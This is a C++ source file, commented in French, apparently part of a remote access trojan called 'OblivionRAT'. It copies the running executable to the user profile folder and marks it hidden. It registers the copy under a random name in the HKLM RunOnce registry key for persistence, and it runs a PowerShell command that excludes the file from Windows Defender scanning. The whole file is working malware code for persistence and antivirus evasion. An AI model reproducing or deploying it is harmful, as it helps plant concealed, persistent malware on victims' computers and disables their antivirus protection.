#include "reg.h"


void AddToStartup(void)
{
    wchar_t buffer[MAX_PATH];

    // Obtenir le chemin du fichier exécutable actuel
    if (GetModuleFileName(NULL, buffer, MAX_PATH) == 0) {
        std::wcerr << L"Erreur lors de l'obtention du chemin du fichier exécutable : " << GetLastError() << std::endl;
    }

    // Définir le chemin de destination en utilisant %userprofile%
    wchar_t dest[MAX_PATH];
    ExpandEnvironmentStrings(L"%userprofile%\\OblivionRAT.exe", dest, MAX_PATH);

    // Vérifier si le fichier existe déjà
    if (PathFileExists(dest)) {
        std::wcout << L"File already exists" << std::endl;
    }
    else {
        // Copier le fichier exécutable vers le répertoire de destination
        if (!CopyFile(buffer, dest, FALSE)) {
            std::wcerr << L"Erreur lors de la copie du fichier : " << GetLastError() << std::endl;
        }
        // Définir l'attribut caché sur le fichier
        if (!SetFileAttributes(dest, FILE_ATTRIBUTE_HIDDEN)) {
            std::wcerr << L"Erreur lors de la définition de l'attribut caché : " << GetLastError() << std::endl;
        }
        std::wcout << L"File copied and attribute set successfully" << std::endl;
    }

    // Appel des deux fonctions distinctes pour générer la clé de registre aléatoire et la définir
    std::wstring randomRegistryKey = GenerateRandomRegistryKey(10);
    std::wstring wideDest = dest;
    SetStartupRegistryKey(randomRegistryKey, wideDest);
    SetExclusionRegistryKey(dest);
}

std::wstring GenerateRandomRegistryKey(int length) {
    std::wstring alphabet = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::wstring randomKey;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, alphabet.size() - 1);

    for (int i = 0; i < length; ++i) {
        randomKey.push_back(alphabet[dis(gen)]);
    }

    return randomKey;
}

void SetStartupRegistryKey(const std::wstring& registryKey, const std::wstring& value) {
    // Convertir la clé et la valeur en chaînes de caractères std::string
    std::wstring wstrRegistryKey = registryKey;
    std::wstring wstrValue = value;
    std::string strRegistryKey(wstrRegistryKey.begin(), wstrRegistryKey.end());
    std::string strValue(wstrValue.begin(), wstrValue.end());

    // Construire la commande PowerShell pour ajouter l'entrée au registre
    std::string powershellCmd = "powershell -Command \"New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Name '" + strRegistryKey + "' -Value '" + strValue + "' -PropertyType String -Force\"";

    // Exécuter la commande PowerShell
    int result = system(powershellCmd.c_str());

    // Vérifier le résultat de l'exécution
    if (result == 0) {
        std::wcout << L"Startup configured successfully" << std::endl;
    }
    else {
        std::wcerr << L"Error configuring startup: " << result << std::endl;
    }
}

void SetExclusionRegistryKey(const wchar_t* value) {
    // Convertir le chemin d'exclusion en std::string pour la commande PowerShell
    std::wstring wstr(value);
    std::string str(wstr.begin(), wstr.end());

    // Commande PowerShell pour ajouter l'exclusion
    std::string addCmd = "powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"" + str + "\"";
    if (system(addCmd.c_str()) == 0) {
        std::cout << "Exclusion added successfully" << std::endl;
    }
    else {
        std::cerr << "Error adding exclusion" << std::endl;
    }
}